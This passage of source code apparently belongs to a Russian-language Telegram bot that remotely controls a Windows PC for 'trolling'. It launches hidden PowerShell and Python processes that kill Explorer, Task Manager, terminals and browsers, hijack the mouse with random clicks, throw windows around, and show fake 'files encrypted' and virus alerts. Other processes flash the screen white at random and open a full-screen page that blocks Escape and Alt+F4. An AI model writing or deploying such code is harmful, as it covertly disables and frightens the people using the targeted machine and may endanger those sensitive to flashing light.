        minutes = duration // 60 if duration >= 60 else 0
        seconds = duration % 60
        time_str = f"{minutes} мин" if minutes > 0 else f"{seconds} сек"
        
        await query.edit_message_text(f"🚫 Запускаю блокировщик доступа на {time_str}...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт для блокировки программ
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Список заблокированных программ
                $blockedPrograms = @(
                    "explorer",
                    "chrome",
                    "firefox",
                    "msedge",
                    "iexplore",
                    "opera",
                    "brave",
                    "cmd",
                    "powershell",
                    "taskmgr",
                    "regedit",
                    "notepad",
                    "calc",
                    "mspaint",
                    "control",
                    "steam",
                    "discord",
                    "telegram",
                    "skype",
                    "zoom"
                )
                
                $startTime = Get-Date
                $duration = {duration}
                $blockedCount = 0
                
                # Функция показа сообщения
                function Show-AccessDenied {{
                    param($programName)
                    
                    $form = New-Object System.Windows.Forms.Form
                    $form.Text = "Доступ запрещён"
                    $form.Size = New-Object System.Drawing.Size(400, 200)
                    $form.StartPosition = "CenterScreen"
                    $form.TopMost = $true
                    $form.FormBorderStyle = "FixedDialog"
                    $form.MaximizeBox = $false
                    $form.MinimizeBox = $false
                    $form.BackColor = [System.Drawing.Color]::FromArgb(240, 240, 240)
                    
                    # Иконка ошибки
                    $iconLabel = New-Object System.Windows.Forms.Label
                    $iconLabel.Text = "🚫"
                    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI", 32)
                    $iconLabel.Size = New-Object System.Drawing.Size(80, 80)
                    $iconLabel.Location = New-Object System.Drawing.Point(20, 20)
                    $iconLabel.TextAlign = "MiddleCenter"
                    $form.Controls.Add($iconLabel)
                    
                    # Заголовок
                    $titleLabel = New-Object System.Windows.Forms.Label
                    $titleLabel.Text = "ДОСТУП ЗАБЛОКИРОВАН"
                    $titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Bold)
                    $titleLabel.Size = New-Object System.Drawing.Size(260, 30)
                    $titleLabel.Location = New-Object System.Drawing.Point(110, 30)
                    $titleLabel.ForeColor = [System.Drawing.Color]::Red
                    $form.Controls.Add($titleLabel)
                    
                    # Текст сообщения
                    $messageLabel = New-Object System.Windows.Forms.Label
                    $messageLabel.Text = "Программа `"$programName`" временно недоступна.`n`nОбратитесь к администратору."
                    $messageLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
                    $messageLabel.Size = New-Object System.Drawing.Size(260, 60)
                    $messageLabel.Location = New-Object System.Drawing.Point(110, 70)
                    $form.Controls.Add($messageLabel)
                    
                    # Кнопка OK
                    $okButton = New-Object System.Windows.Forms.Button
                    $okButton.Text = "OK"
                    $okButton.Size = New-Object System.Drawing.Size(100, 30)
                    $okButton.Location = New-Object System.Drawing.Point(150, 130)
                    $okButton.Add_Click({{ $form.Close() }})
                    $form.Controls.Add($okButton)
                    
                    # Автозакрытие через 3 секунды
                    $timer = New-Object System.Windows.Forms.Timer
                    $timer.Interval = 3000
                    $timer.Add_Tick({{
                        $form.Close()
                        $timer.Stop()
                    }})
                    $timer.Start()
                    
                    $form.ShowDialog() | Out-Null
                    $form.Dispose()
                }}
                
                Write-Host "🚫 Блокировщик доступа запущен на $duration секунд"
                Write-Host "📋 Заблокировано программ: $($blockedPrograms.Count)"
                
                # Главный цикл
                while ($true) {{
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    if ($elapsed -ge $duration) {{
                        break
                    }}
                    
                    # Проверяем запущенные процессы
                    foreach ($program in $blockedPrograms) {{
                        $processes = Get-Process -Name $program -ErrorAction SilentlyContinue
                        
                        if ($processes) {{
                            foreach ($proc in $processes) {{
                                try {{
                                    # Показываем сообщение в отдельном потоке
                                    Start-Job -ScriptBlock {{
                                        param($programName, $showFunction)
                                        . ([ScriptBlock]::Create($showFunction))
                                        Show-AccessDenied -programName $programName
                                    }} -ArgumentList $program.ToUpper(), ${{function:Show-AccessDenied}}.ToString() | Out-Null
                                    
                                    # Закрываем процесс
                                    $proc.Kill()
                                    Write-Host "❌ Заблокирована программа: $program (PID: $($proc.Id))"
                                    $blockedCount++
                                }} catch {{
                                    # Игнорируем ошибки (процесс может быть системным)
                                }}
                            }}
                        }}
                    }}
                    
                    Start-Sleep -Milliseconds 500
                }}
                
                Write-Host "✅ Блокировщик завершил работу"
                Write-Host "📊 Всего заблокировано попыток: $blockedCount"
                
                # Очистка фоновых заданий
                Get-Job | Remove-Job -Force
                '''
                
                # Запускаем процесс блокировщика
                ACCESS_BLOCKER_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                blocked_list = "• Explorer\n• Chrome, Firefox, Edge\n• Task Manager\n• CMD, PowerShell\n• Discord, Telegram, Skype\n• Steam\n• И другие..."
                
                await query.edit_message_text(
                    f"✅ Блокировщик доступа активирован!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"🚫 Блокируемые программы:\n{blocked_list}\n\n"
                    f"💬 При попытке запуска:\n"
                    f"• Программа закрывается\n"
                    f"• Показывается \"ДОСТУП ЗАБЛОКИРОВАН\"\n"
                    f"• Пользователь не может работать\n\n"
                    f"🔓 Можно разблокировать вручную через меню"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "access_blocker_stop":
        await query.edit_message_text("🔓 Разблокирую доступ...")
        
        try:
            if ACCESS_BLOCKER_PROCESS is not None:
                # Завершаем процесс блокировщика
                ACCESS_BLOCKER_PROCESS.terminate()
                ACCESS_BLOCKER_PROCESS.wait(timeout=3)
                ACCESS_BLOCKER_PROCESS = None
                
                await query.edit_message_text(
                    "✅ Доступ разблокирован!\n\n"
                    "🔓 Программы можно запускать\n"
                    "✅ Блокировщик остановлен\n"
                    "👌 Всё работает нормально"
                )
            else:
                await query.edit_message_text("⚠️ Блокировщик не был активен")
        except Exception as e:
            ACCESS_BLOCKER_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("mouse_shake_"):
        # Тряска мышки
        duration_str = action.split("_")[2]
        duration = 0 if duration_str == "infinite" else int(duration_str)
        time_str = "∞ бесконечно" if duration == 0 else f"{duration // 60} мин" if duration >= 60 else f"{duration} сек"
        
        await query.edit_message_text(f"🖱️ Запускаю тряску мышки на {time_str}...")
        
        try:
            if not PYAUTOGUI_AVAILABLE:
                await query.edit_message_text("❌ pyautogui не установлен\n\nУстановите: pip install pyautogui")
                await show_back_button(query)
                return
            
            if platform.system() == "Windows":
                # Python скрипт для тряски мышки
                mouse_code = f'''import pyautogui
import random
import time
import sys

pyautogui.FAILSAFE = False  # Отключаем защиту

screen_width, screen_height = pyautogui.size()
start_time = time.time()
duration = {duration if duration > 0 else 9999999}

print("🖱️ Тряска мышки запущена")

while True:
    if {duration} > 0 and (time.time() - start_time) >= duration:
        break
    
    # Случайные координаты
    x = random.randint(0, screen_width - 1)
    y = random.randint(0, screen_height - 1)
    
    try:
        # Мгновенное перемещение
        pyautogui.moveTo(x, y, duration=0.05)
        
        # Случайные клики (иногда)
        if random.random() < 0.1:  # 10% шанс клика
            pyautogui.click()
        
        # Очень маленькая задержка
        time.sleep(0.05)
    except:
        pass

print("✅ Тряска завершена")
'''
                
                # Сохраняем во временный файл
                import tempfile
                temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, encoding='utf-8')
                temp_file.write(mouse_code)
                temp_file.close()
                
                # Запускаем процесс
                MOUSE_SHAKE_PROCESS = subprocess.Popen(
                    [sys.executable, temp_file.name],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    f"✅ Тряска мышки активирована!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"🌀 Курсор хаотично двигается\n"
                    f"🚫 Управление невозможно\n"
                    f"💀 Пользователь в панике\n\n"
                    f"🎯 Эффекты:\n"
                    f"• Мгновенные перемещения\n"
                    f"• Случайные клики\n"
                    f"• Скорость 20 движений/сек\n"
                    f"• Невозможно работать\n\n"
                    f"🛑 Остановить вручную через меню"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "mouse_shake_stop":
        await query.edit_message_text("🛑 Останавливаю тряску мышки...")
        
        try:
            if MOUSE_SHAKE_PROCESS is not None:
                MOUSE_SHAKE_PROCESS.terminate()
                MOUSE_SHAKE_PROCESS.wait(timeout=3)
                MOUSE_SHAKE_PROCESS = None
                
                await query.edit_message_text(
                    "✅ Тряска мышки остановлена!\n\n"
                    "🖱️ Курсор работает нормально\n"
                    "✅ Управление восстановлено\n"
                    "👌 Всё в порядке"
                )
            else:
                await query.edit_message_text("⚠️ Тряска мышки не была активна")
        except Exception as e:
            MOUSE_SHAKE_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("window_troll_"):
        # Оконное троллинг
        duration_str = action.split("_")[2]
        duration = 0 if duration_str == "infinite" else int(duration_str)
        time_str = "∞ бесконечно" if duration == 0 else f"{duration // 60} мин" if duration >= 60 else f"{duration} сек"
        
        await query.edit_message_text(f"🪟 Запускаю оконное троллинг на {time_str}...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт для оконного троллинга
                ps_command = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$startTime = Get-Date
$duration = {duration if duration > 0 else 9999999}
$notepadCount = 0

Write-Host "🪟 Оконное троллинг запущено"

while ($true) {{
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    if ({duration} -gt 0 -and $elapsed -ge $duration) {{
        break
    }}
    
    # Случайное действие
    $action = Get-Random -Minimum 1 -Maximum 5
    
    switch ($action) {{
        1 {{
            # Открыть Notepad с сообщением
            if ($notepadCount -lt 50) {{
                Start-Process notepad
                $notepadCount++
            }}
        }}
        2 {{
            # Переместить случайное окно
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {{
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}}
"@
            $hwnd = [WinAPI]::GetForegroundWindow()
            if ($hwnd -ne [IntPtr]::Zero) {{
                $x = Get-Random -Minimum 0 -Maximum 800
                $y = Get-Random -Minimum 0 -Maximum 600
                [WinAPI]::SetWindowPos($hwnd, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001)
            }}
        }}
        3 {{
            # Показать фейковое сообщение об ошибке
            $messages = @(
                "Критическая ошибка системы!",
                "Ваши файлы зашифрованы!",
                "Обнаружен вирус!",
                "System32 удаляется...",
                "Доступ запрещён!"
            )
            $msg = $messages[(Get-Random -Minimum 0 -Maximum $messages.Count)]
            Start-Job -ScriptBlock {{
                param($message)
                Add-Type -AssemblyName System.Windows.Forms
                [System.Windows.Forms.MessageBox]::Show($message, "ОШИБКА", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
            }} -ArgumentList $msg | Out-Null
        }}
        4 {{
            # Изменить размер окна
            Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {{
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}}
"@
            $hwnd = [WinAPI]::GetForegroundWindow()
            if ($hwnd -ne [IntPtr]::Zero) {{
                $width = Get-Random -Minimum 200 -Maximum 1200
                $height = Get-Random -Minimum 200 -Maximum 800
                [WinAPI]::SetWindowPos($hwnd, [IntPtr]::Zero, 0, 0, $width, $height, 0x0002)
            }}
        }}
    }}
    
    Start-Sleep -Milliseconds 500
}}

Write-Host "✅ Оконное троллинг завершено"

# Закрываем все Notepad
Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force

# Очистка фоновых заданий
Get-Job | Remove-Job -Force
'''
                
                # Запускаем процесс
                WINDOW_TROLL_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    f"✅ Оконное троллинг активировано!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"🪟 Окна летают по экрану\n"
                    f"📝 Notepad открывается\n"
                    f"❌ Фейковые ошибки\n"
                    f"💀 Хаос на экране\n\n"
                    f"🎯 Эффекты:\n"
                    f"• Перемещение окон\n"
                    f"• Изменение размеров\n"
                    f"• Множество Notepad\n"
                    f"• Сообщения об ошибках\n\n"
                    f"🛑 Остановить вручную через меню"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "window_troll_stop":
        await query.edit_message_text("🛑 Останавливаю оконное троллинг...")
        
        try:
            if WINDOW_TROLL_PROCESS is not None:
                WINDOW_TROLL_PROCESS.terminate()
                WINDOW_TROLL_PROCESS.wait(timeout=3)
                WINDOW_TROLL_PROCESS = None
                
                # Закрываем все Notepad
                if platform.system() == "Windows":
                    subprocess.run(["taskkill", "/F", "/IM", "notepad.exe"], capture_output=True)
                
                await query.edit_message_text(
                    "✅ Оконное троллинг остановлено!\n\n"
                    "🪟 Окна перестали двигаться\n"
                    "📝 Notepad закрыты\n"
                    "✅ Порядок восстановлен\n"
                    "👌 Всё в норме"
                )
            else:
                await query.edit_message_text("⚠️ Оконное троллинг не было активно")
        except Exception as e:
            WINDOW_TROLL_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("flash_"):
        # Внезапные вспышки
        duration_str = action.split("_")[1]
        duration = 0 if duration_str == "infinite" else int(duration_str)
        time_str = "∞ бесконечно" if duration == 0 else f"{duration // 60} мин" if duration >= 60 else f"{duration} сек"
        
        await query.edit_message_text(f"⚡ Запускаю внезапные вспышки на {time_str}...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт для вспышек
                ps_command = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$startTime = Get-Date
$duration = {duration if duration > 0 else 9999999}

Write-Host "⚡ Вспышки запущены"

while ($true) {{
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    if ({duration} -gt 0 -and $elapsed -ge $duration) {{
        break
    }}
    
    # Случайная задержка между вспышками (3-15 секунд)
    $delay = Get-Random -Minimum 3 -Maximum 15
    Start-Sleep -Seconds $delay
    
    # Создаём белую вспышку на весь экран
    $flash = New-Object System.Windows.Forms.Form
    $flash.FormBorderStyle = 'None'
    $flash.WindowState = 'Maximized'
    $flash.TopMost = $true
    $flash.BackColor = [System.Drawing.Color]::White
    $flash.ShowInTaskbar = $false
    $flash.Opacity = 1.0
    
    # Показываем форму
    $flash.Show()
    [System.Windows.Forms.Application]::DoEvents()
    
    # Воспроизводим звук вспышки (опционально)
    [Console]::Beep(2000, 100)
    
    # Держим вспышку 150-300 миллисекунд
    $flashDuration = Get-Random -Minimum 150 -Maximum 300
    Start-Sleep -Milliseconds $flashDuration
    
    # Закрываем вспышку
    $flash.Close()
    $flash.Dispose()
    
    Write-Host "⚡ Вспышка!"
}}

Write-Host "✅ Вспышки завершены"
'''
                
                # Запускаем процесс
                FLASH_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    f"✅ Внезапные вспышки активированы!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"⚡ Экран вспыхивает белым\n"
                    f"💥 Случайные интервалы 3-15 сек\n"
                    f"😱 Пугает и слепит\n\n"
                    f"🎯 Эффекты:\n"
                    f"• Яркие белые вспышки\n"
                    f"• Короткий звуковой сигнал\n"
                    f"• Непредсказуемо\n"
                    f"• Раздражает глаза\n"
                    f"• Как молния на экране\n\n"
                    f"🛑 Остановить вручную через меню"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "flash_stop":
        await query.edit_message_text("🛑 Останавливаю вспышки...")
        
        try:
            if FLASH_PROCESS is not None:
                FLASH_PROCESS.terminate()
                FLASH_PROCESS.wait(timeout=3)
                FLASH_PROCESS = None
                
                await query.edit_message_text(
                    "✅ Вспышки остановлены!\n\n"
                    "⚡ Экран больше не вспыхивает\n"
                    "✅ Всё спокойно\n"
                    "👌 Глаза отдыхают"
                )
            else:
                await query.edit_message_text("⚠️ Вспышки не были активны")
        except Exception as e:
            FLASH_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("bugs_"):
        # Фейковые насекомые
        duration_str = action.split("_")[1]
        duration = 0 if duration_str == "infinite" else int(duration_str)
        time_str = "∞ бесконечно" if duration == 0 else f"{duration // 60} мин" if duration >= 60 else f"{duration} сек"
        
        await query.edit_message_text(f"🕷️ Запускаю насекомых на {time_str}...")
        
        try:
            if platform.system() == "Windows":
                # Получаем путь к GIF файлу
                script_dir = os.path.dirname(os.path.abspath(__file__))
                photo_dir = os.path.join(script_dir, "photo")
                
                # Ищем GIF файлы
                bug_files = []
                for file in os.listdir(photo_dir):
                    if file.lower().endswith('.gif'):
                        bug_files.append(os.path.join(photo_dir, file))
                
                if not bug_files:
                    await query.edit_message_text("❌ Не найдены GIF файлы в папке photo/")
                    await show_back_button(query)
                    return
                
                # Выбираем первый GIF
                bug_path = bug_files[0]
                
                # PowerShell скрипт для отображения GIF насекомых
                ps_command = f'''Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$gifPath = "{bug_path.replace(chr(92), chr(92)+chr(92))}"
$startTime = Get-Date
$duration = {duration if duration > 0 else 9999999}

Write-Host "🕷️ Насекомые запущены"

# Создаём несколько насекомых (от 3 до 7)
$bugCount = Get-Random -Minimum 3 -Maximum 8
$bugs = @()
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

for ($i = 0; $i -lt $bugCount; $i++) {{
    $form = New-Object System.Windows.Forms.Form
    $form.FormBorderStyle = 'None'
    $form.BackColor = [System.Drawing.Color]::Lime
    $form.TransparencyKey = [System.Drawing.Color]::Lime
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    
    # Загружаем GIF
    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
    $pictureBox.SizeMode = 'AutoSize'
    $form.Controls.Add($pictureBox)
    
    # Размер формы по размеру картинки
    $form.Size = $pictureBox.Image.Size
    
    # Случайная позиция
    $x = Get-Random -Minimum 0 -Maximum ($screenWidth - $form.Width)
    $y = Get-Random -Minimum 0 -Maximum ($screenHeight - $form.Height)
    $form.Location = New-Object System.Drawing.Point($x, $y)
    
    # Случайное направление движения
    $bug = @{{
        Form = $form
        SpeedX = Get-Random -Minimum -3 -Maximum 4
        SpeedY = Get-Random -Minimum -3 -Maximum 4
    }}
    
    $bugs += $bug
    $form.Show()
}}

Write-Host "🦂 Создано насекомых: $bugCount"

# Главный цикл - движение насекомых ВЕЗДЕ!
$iteration = 0
while ($true) {{
    $elapsed = ((Get-Date) - $startTime).TotalSeconds
    if ({duration} -gt 0 -and $elapsed -ge $duration) {{
        break
    }}
    
    $iteration++
    
    # Каждые 10 секунд добавляем новых насекомых (до 15 максимум)
    if ($iteration % 200 -eq 0 -and $bugs.Count -lt 15) {{
        $newBugCount = Get-Random -Minimum 1 -Maximum 3
        for ($i = 0; $i -lt $newBugCount; $i++) {{
            $form = New-Object System.Windows.Forms.Form
            $form.FormBorderStyle = 'None'
            $form.BackColor = [System.Drawing.Color]::Lime
            $form.TransparencyKey = [System.Drawing.Color]::Lime
            $form.TopMost = $true
            $form.ShowInTaskbar = $false
            
            $pictureBox = New-Object System.Windows.Forms.PictureBox
            $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
            $pictureBox.SizeMode = 'AutoSize'
            $form.Controls.Add($pictureBox)
            $form.Size = $pictureBox.Image.Size
            
            $x = Get-Random -Minimum 0 -Maximum ($screenWidth - $form.Width)
            $y = Get-Random -Minimum 0 -Maximum ($screenHeight - $form.Height)
            $form.Location = New-Object System.Drawing.Point($x, $y)
            
            $bug = @{{
                Form = $form
                SpeedX = Get-Random -Minimum -5 -Maximum 6
                SpeedY = Get-Random -Minimum -5 -Maximum 6
            }}
            
            $bugs += $bug
            $form.Show()
            Write-Host "🦗 Появилось новое насекомое!"
        }}
    }}
    
    foreach ($bug in $bugs) {{
        $form = $bug.Form
        
        if (-not $form.IsDisposed) {{
            # Случайная ТЕЛЕПОРТАЦИЯ (прыжок в другое место) - 3% шанс
            if ((Get-Random -Minimum 1 -Maximum 100) -lt 3) {{
                $newX = Get-Random -Minimum 0 -Maximum ($screenWidth - $form.Width)
                $newY = Get-Random -Minimum 0 -Maximum ($screenHeight - $form.Height)
                $form.Location = New-Object System.Drawing.Point($newX, $newY)
                Write-Host "⚡ Насекомое телепортировалось!"
                continue
            }}
            
            # Обновляем позицию (увеличенная скорость)
            $newX = $form.Location.X + $bug.SpeedX
            $newY = $form.Location.Y + $bug.SpeedY
            
            # Отскок от краёв экрана
            if ($newX -le 0 -or $newX -ge ($screenWidth - $form.Width)) {{
                $bug.SpeedX = -$bug.SpeedX
                $newX = [Math]::Max(0, [Math]::Min($newX, $screenWidth - $form.Width))
            }}
            if ($newY -le 0 -or $newY -ge ($screenHeight - $form.Height)) {{
                $bug.SpeedY = -$bug.SpeedY
                $newY = [Math]::Max(0, [Math]::Min($newY, $screenHeight - $form.Height))
            }}
            
            # Часто меняем направление (рандомное хаотичное движение) - 15% шанс
            if ((Get-Random -Minimum 1 -Maximum 100) -lt 15) {{
                $bug.SpeedX = Get-Random -Minimum -5 -Maximum 6
                $bug.SpeedY = Get-Random -Minimum -5 -Maximum 6
            }}
            
            # Иногда УСКОРЕНИЕ - 5% шанс
            if ((Get-Random -Minimum 1 -Maximum 100) -lt 5) {{
                $bug.SpeedX = $bug.SpeedX * 2
                $bug.SpeedY = $bug.SpeedY * 2
            }}
            
            # Иногда ЗАМЕДЛЕНИЕ - 5% шанс
            if ((Get-Random -Minimum 1 -Maximum 100) -lt 5) {{
                $bug.SpeedX = [Math]::Round($bug.SpeedX / 2)
                $bug.SpeedY = [Math]::Round($bug.SpeedY / 2)
            }}
            
            $form.Location = New-Object System.Drawing.Point($newX, $newY)
        }}
    }}
    
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 50
}}

Write-Host "✅ Насекомые удалены"

# Закрываем все формы
foreach ($bug in $bugs) {{
    if (-not $bug.Form.IsDisposed) {{
        $bug.Form.Close()
        $bug.Form.Dispose()
    }}
}}
'''
                
                # Запускаем процесс
                BUGS_PROCESS = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", ps_command],
                    creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
                )
                
                await query.edit_message_text(
                    f"✅ Фейковые насекомые активированы!\n\n"
                    f"⏱️ Длительность: {time_str}\n"
                    f"🕷️ Начальное кол-во: 3-7\n"
                    f"🦗 Максимум: до 15 насекомых!\n"
                    f"🎬 GIF анимация\n\n"
                    f"🎯 Новые эффекты:\n"
                    f"• 🌀 Летают ВЕЗДЕ по экрану\n"
                    f"• ⚡ Телепортируются случайно!\n"
                    f"• 🦗 Новые появляются каждые 10 сек\n"
                    f"• 🚀 Случайное ускорение\n"
                    f"• 🐌 Случайное замедление\n"
                    f"• 🎲 Хаотичное движение\n"
                    f"• 💀 Невозможно отследить!\n\n"
                    f"⚠️ МАКСИМАЛЬНЫЙ ХАОС!\n"
                    f"🛑 Остановить вручную через меню"
                )
            else:
                await query.edit_message_text("❌ Функция доступна только на Windows")
        except Exception as e:
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action == "bugs_stop":
        await query.edit_message_text("🛑 Убираю насекомых...")
        
        try:
            if BUGS_PROCESS is not None:
                BUGS_PROCESS.terminate()
                BUGS_PROCESS.wait(timeout=3)
                BUGS_PROCESS = None
                
                await query.edit_message_text(
                    "✅ Насекомые убраны!\n\n"
                    "🕷️ Экран чистый\n"
                    "✅ Насекомые исчезли\n"
                    "👌 Всё спокойно"
                )
            else:
                await query.edit_message_text("⚠️ Насекомые не были активны")
        except Exception as e:
            BUGS_PROCESS = None
            await query.edit_message_text(f"❌ Ошибка: {str(e)}")
        await show_back_button(query)
    
    elif action.startswith("falling_screen_"):
        # Падающий экран
        duration_str = action.split("_")[2]
        duration = 0 if duration_str == "infinite" else int(duration_str)
        time_str = "∞ бесконечно" if duration == 0 else f"{duration // 60} мин" if duration >= 60 else f"{duration} сек"
        
        await query.edit_message_text("📺 Запускаю падающий экран...")
        
        try:
            if platform.system() == "Windows":
                # PowerShell скрипт для эффекта падающего размытого экрана
                ps_command = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                
                # Получаем размеры экрана
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $screenWidth = $screen.Width
                $screenHeight = $screen.Height
                
                # Создаем форму на весь экран
                $form = New-Object System.Windows.Forms.Form
                $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
                $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
                $form.TopMost = $true
                $form.BackColor = [System.Drawing.Color]::Black
                $form.ShowInTaskbar = $false
                
                # Создаем HTML для эффекта падающего экрана
                $htmlContent = @"
<!DOCTYPE html>
<html>
<head>
    <title>📺 ПАДАЮЩИЙ ЭКРАН</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: black;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }}
        .screen {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: linear-gradient(45deg, #333, #666, #333);
            background-size: 200% 200%;
            animation: fall 3s ease-in-out infinite, blur 3s ease-in-out infinite, static 0.1s infinite;
            border: 2px solid #555;
            box-shadow: 0 0 50px rgba(255,255,255,0.1);
        }}
        
        @keyframes fall {{
            0% {{ transform: translateY(0px) scaleY(1); filter: blur(0px); }}
            50% {{ transform: translateY(200px) scaleY(0.8); filter: blur(5px); }}
            100% {{ transform: translateY(0px) scaleY(1); filter: blur(0px); }}
        }}
        
        @keyframes blur {{
            0% {{ filter: blur(0px) brightness(1); }}
            50% {{ filter: blur(10px) brightness(0.5); }}
            100% {{ filter: blur(0px) brightness(1); }}
        }}
        
        @keyframes static {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.95; }}
            100% {{ opacity: 1; }}
        }}
        
        .glitch {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #ff0000;
            font-size: 48px;
            font-weight: bold;
            text-shadow: 2px 2px 0px #00ff00, -2px -2px 0px #0000ff;
            animation: glitch 0.5s infinite;
        }}
        
        @keyframes glitch {{
            0% {{ transform: translate(-50%, -50%) skew(0deg); }}
            25% {{ transform: translate(-52%, -48%) skew(2deg); }}
            50% {{ transform: translate(-48%, -52%) skew(-2deg); }}
            75% {{ transform: translate(-52%, -48%) skew(1deg); }}
            100% {{ transform: translate(-50%, -50%) skew(0deg); }}
        }}
        
        .static-lines {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                0deg,
                transparent,
                transparent 2px,
                rgba(255,255,255,0.03) 2px,
                rgba(255,255,255,0.03) 4px
            );
            animation: scan 2s linear infinite;
        }}
        
        @keyframes scan {{
            0% {{ transform: translateY(-100%); }}
            100% {{ transform: translateY(100vh); }}
        }}
    </style>
</head>
<body>
    <div class="screen">
        <div class="static-lines"></div>
        <div class="glitch">📺 ЭКРАН ПАДАЕТ!</div>
    </div>
    
    <script>
        // Звуки статики
        let audioContext;
        let noiseBuffer;
        
        function createNoise() {{
            if (!audioContext) {{
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const bufferSize = audioContext.sampleRate * 0.1;
                noiseBuffer = audioContext.createBuffer(1, bufferSize, audioContext.sampleRate);
                const output = noiseBuffer.getChannelData(0);
                
                for (let i = 0; i < bufferSize; i++) {{
                    output[i] = Math.random() * 0.1 - 0.05;
                }}
            }}
            
            const source = audioContext.createBufferSource();
            source.buffer = noiseBuffer;
            source.connect(audioContext.destination);
            source.start();
        }}
        
        // Воспроизводим статику каждые 3 секунды
        setInterval(createNoise, 3000);
        
        // Блокируем закрытие
        window.addEventListener('beforeunload', function(e) {{
            e.preventDefault();
            e.returnValue = '';
            return '';
        }});
        
        // Блокируем клавиши
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'F11' || e.key === 'Escape' || 
                (e.altKey && e.key === 'F4') || 
                (e.ctrlKey && e.key === 'w')) {{
                e.preventDefault();
                return false;
            }}
        }});
        
        // Автоматически в полный экран
        setTimeout(function() {{
            document.documentElement.requestFullscreen();
